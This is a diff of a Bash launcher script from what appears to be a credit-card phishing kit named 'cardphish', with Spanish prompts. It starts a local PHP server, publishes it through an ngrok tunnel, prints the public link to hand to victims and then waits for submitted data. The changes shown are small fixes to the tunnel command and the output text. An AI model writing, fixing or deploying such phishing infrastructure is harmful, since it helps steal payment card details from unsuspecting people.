@@ -29,7 +29,7 @@ function banner {
 function comenzar {
 
 	cd $HOME/cardphish
-	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	echo -e "${yellow} SELECCIONE EL LENGUAGE DEL SCRITP${white}\n"
 	echo -e "${yellow}    [${red}01${yellow}]${white}Español      ${yellow}[${red}02${yellow}]${white}Inglés\n"
 	read -p $' >> ' hol
@@ -41,12 +41,12 @@ function comenzar {
 	php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 	sleep 2
 	echo -e "${yellow}[${red}*${yellow}]${green} Abriendo servidor ngrok..."
-	./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
+	./ngrok http 3333 > /dev/null 2>&1 &
 	sleep 10
 	echo -e "${yellow}[${red}*${yellow}]${green} Obteniendo URLs..."
 	echo -e "${yellow}[${red}*${yellow}]${green} Link local: ${white}localhost:4433"
 	sleep 2
-	echo -ne "${yellow}[${red}*${yellow}]${green} Link fuera de LAN:${white}"
+	echo -ne "${yellow}[${red}*${yellow}]${green} Link fuera de LAN: ${white}"
 	curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"
 	sleep 1
 	echo -e "\e[1;90mEsperando datos...\e[0m"
